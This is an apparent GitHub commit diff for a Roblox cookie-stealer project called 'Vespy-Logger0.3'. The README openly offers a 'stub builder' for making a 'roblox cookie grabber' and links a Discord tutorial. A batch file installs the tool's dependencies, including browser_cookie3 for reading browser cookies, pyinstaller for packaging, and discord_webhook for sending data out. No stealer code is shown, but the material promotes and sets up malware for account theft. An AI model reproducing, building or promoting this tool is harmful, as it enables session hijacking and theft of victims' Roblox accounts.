f24ba1e71202e0e25b39ffc54b6ed717ce353297
MrZeuzus <108227869+MrZeuzus@users.noreply.github.com>
2022-07-02 00:41:38 +0100

    Add files via upload

--- README.md
+++ README.md
@@ -1,2 +1,7 @@
-# Roblox-CookieStealer
-Steal Roblox Cookies
+# Vespy-Logger0.3
+Stub builder to make a roblox cookie grabber with cool features and custom console
+
+If you dont know how to setup it, please watch my tutorial
+https://discord.gg/FyCUdSVqwa
+
+Thank you for using Vespy logger. im working on 0.4 now
---
+++ requirements.bat
@@ -0,0 +1,14 @@
+echo Installing requirements..
+pip install browser_cookie3==0.13.0
+pip install pyinstaller==4.7
+pip install discord_webhook==0.13.0
+pip install requests
+pip install Pillow
+pip install urllib3
+pip install Crypto
+pip install colorama
+pip install setuptools
+pip install psutil
+pip install numpy
+pip install pywin32
+echo All requirements have been downloaded..
